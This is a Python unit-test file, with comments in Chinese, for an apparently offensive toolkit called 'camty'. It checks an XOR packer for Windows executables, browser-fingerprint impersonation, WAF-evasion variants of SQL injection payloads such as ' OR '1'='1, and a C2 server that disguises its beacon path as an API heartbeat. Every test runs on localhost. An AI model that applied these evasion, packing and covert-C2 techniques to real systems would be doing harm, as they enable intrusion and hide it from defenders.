"""对抗纵深批次测试：XOR 打包回环 / HTTP 指纹回退 / evasion 新变体 / C2 伪装路由。"""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import time
import unittest
import urllib.request
from pathlib import Path
from unittest import mock

from camty.modules import http_fp
from camty.modules.inj_probe import _double_encode, _hpp_split, _sql_comment_split, evasion_variants

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "c2" / "server"))


class TestPackXor(unittest.TestCase):
    def test_roundtrip(self):
        from scripts.pack_xor import pack, unpack

        src = Path(tempfile.mkdtemp()) / "pe.bin"
        dst = src.with_suffix(".b64")
        src.write_bytes(b"MZ" + b"\x90" * 4096)
        pack(src, dst, "camty")
        restored = unpack(dst.read_text(encoding="ascii"), "camty")
        self.assertEqual(restored, src.read_bytes())
        self.assertTrue(restored.startswith(b"MZ"))

    def test_wrong_key_breaks_mz(self):
        from scripts.pack_xor import pack, unpack

        src = Path(tempfile.mkdtemp()) / "pe.bin"
        dst = src.with_suffix(".b64")
        src.write_bytes(b"MZ" + b"\x90" * 64)
        pack(src, dst, "camty")
        wrong = unpack(dst.read_text(encoding="ascii"), "other")
        self.assertNotEqual(wrong[:2], b"MZ")


class TestHttpFp(unittest.TestCase):
    def test_available_default(self):
        # 环境既定：vendor 有 curl_cffi 且未设禁用 → 可用
        self.assertIsInstance(http_fp.available(), bool)

    def test_env_kill_switch(self):
        with mock.patch.dict("os.environ", {"CAMTY_NO_IMPERSONATE": "1"}):
            self.assertFalse(http_fp.available())

    def test_fetch_fallback_on_error(self):
        # 指纹层异常时返回 None，调用方回退 urllib
        with mock.patch.object(http_fp, "available", return_value=True), \
             mock.patch("camty.modules.http_fp.fetch", side_effect=None) as _:
            pass
        # fetch 对 httpbin 不可达目标返回 None 而不抛错（fp 层+urllib 层都失败）
        out = http_fp.fetch("http://127.0.0.1:1/x", timeout=1.0)
        self.assertIsNone(out)


class TestEvasionNewVariants(unittest.TestCase):
    def test_comment_split(self):
        self.assertIn("SEL/**/ECT", _sql_comment_split("SELECT * FROM x"))

    def test_double_encode(self):
        self.assertEqual(_double_encode("' AND 1"), "%2527%2520AND%25201")

    def test_hpp_split(self):
        self.assertEqual(_hpp_split("1' OR '1'='1"), "&__c=1' OR '1'='1")

    def test_variant_count(self):
        out = evasion_variants("' OR '1'='1", "sqli")
        self.assertEqual(len(out), 7)  # 原始 + 6 变体


class TestC2ProfileRoute(unittest.TestCase):
    """服务端伪装路由：--beacon-path /api/v1/heartbeat 生效，默认 /beacon 反而 404。"""

    @classmethod
    def setUpClass(cls):
        import protocol

        cls.protocol = protocol
        cls.psk = protocol.gen_psk()
        cls.proc = subprocess.Popen(
            [sys.executable,
             str(Path(__file__).resolve().parent.parent / "c2" / "server" / "camty_c2.py"),
             "--beacon-port", "8890", "--api-port", "8891",
             "--token", "prof" + "0" * 28, "--psk", cls.psk.hex(),
             "--ops-log", str(Path(tempfile.mkdtemp()) / "ops.jsonl"),
             "--beacon-path", "/api/v1/heartbeat",
             "--result-path", "/api/v1/report",
             "--beacon-ctype", "application/json"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(50):
            try:
                urllib.request.urlopen("http://127.0.0.1:8891/health", timeout=1)
                return
            except OSError:
                time.sleep(0.2)

    @classmethod
    def tearDownClass(cls):
        cls.proc.kill()

    def _post_sealed(self, path: str) -> int:
        beacon = json.dumps({"id": "prof-host-0001", "host": "h", "user": "u",
                             "arch": "x64", "sleep": 3}).encode()
        blob = self.protocol.seal(self.psk, beacon)
        req = urllib.request.Request(f"http://127.0.0.1:8890{path}", data=blob,
                                     method="POST",
                                     headers={"Content-Type": "application/json",
                                              "User-Agent": "Mozilla/5.0"})
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                return resp.status
        except urllib.error.HTTPError as exc:
            return exc.code

    def test_custom_path_accepted(self):
        self.assertEqual(self._post_sealed("/api/v1/heartbeat"), 200)

    def test_default_path_rejected_when_profiled(self):
        self.assertEqual(self._post_sealed("/beacon"), 404)


if __name__ == "__main__":
    unittest.main()
